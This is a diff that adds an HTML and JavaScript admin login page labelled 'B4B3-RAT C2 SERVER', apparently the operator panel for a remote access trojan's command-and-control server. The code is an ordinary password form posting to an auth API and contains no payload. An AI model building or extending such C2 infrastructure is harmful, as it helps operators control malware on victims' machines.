@@ -1,0 +1,77 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>C2 Login</title>
+<script src="js/config.js"></script>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{background:#0D1B2A;display:flex;align-items:center;justify-content:center;min-height:100vh;font-family:Arial,sans-serif}
+.card{background:#1A2E42;border:1px solid #243C57;border-radius:16px;padding:48px 56px;width:400px}
+h1{color:#F4F7F6;font-size:26px;font-weight:700;margin-bottom:6px}
+p{color:#6B7FA3;font-size:14px;margin-bottom:28px}
+input{width:100%;background:#0D1B2A;border:1px solid #243C57;border-radius:8px;color:#E8EEF4;font-size:15px;padding:11px 14px;outline:none;margin-bottom:14px}
+input:focus{border-color:#00C2A8}
+button{width:100%;background:#00C2A8;border:none;border-radius:8px;color:#0D1B2A;font-size:15px;font-weight:700;padding:13px;cursor:pointer}
+button:disabled{opacity:0.6;cursor:not-allowed}
+.mono{font-family:monospace;font-size:12px;color:#00C2A8;letter-spacing:2px;margin-bottom:20px}
+.err{color:#F4A261;font-size:13px;margin-top:10px;text-align:center}
+</style>
+</head>
+<body>
+<div class="card">
+  <p class="mono">B4B3-RAT C2 SERVER</p>
+  <h1>Admin Login</h1>
+  <p>Authorized personnel only.</p>
+  <input type="password" id="pass" placeholder="Admin password" autofocus autocomplete="current-password">
+  <button id="btn" onclick="doLogin()">Sign In</button>
+  <p class="err" id="err" style="display:none">Incorrect password.</p>
+</div>
+<script>
+document.getElementById('pass').addEventListener('keydown', e => { if (e.key === 'Enter') doLogin(); });
+
+async function doLogin() {
+  const pass = document.getElementById('pass').value;
+  const btn  = document.getElementById('btn');
+  const err  = document.getElementById('err');
+  if (!pass) return;
+
+  btn.disabled  = true;
+  btn.textContent = 'Signing in…';
+  err.style.display = 'none';
+
+  try {
+    const r = await fetch(API_BASE + '/api/auth/login', {
+      method:      'POST',
+      credentials: 'include',
+      headers:     { 'Content-Type': 'application/json' },
+      body:        JSON.stringify({ pass }),
+    });
+    const data = await r.json();
+    if (data.ok) {
+      window.location.href = 'index.html';
+    } else {
+      err.style.display = 'block';
+      err.textContent   = data.error || 'Incorrect password.';
+    }
+  } catch (e) {
+    err.style.display = 'block';
+    err.textContent   = 'Could not reach server: ' + e.message;
+  } finally {
+    btn.disabled    = false;
+    btn.textContent = 'Sign In';
+  }
+}
+
+// If already logged in, skip to dashboard
+(async () => {
+  try {
+    const r = await fetch(API_BASE + '/api/auth/me', { credentials: 'include' });
+    const d = await r.json();
+    if (d.loggedIn) window.location.href = 'index.html';
+  } catch (_) {}
+})();
+</script>
+</body>
+</html>
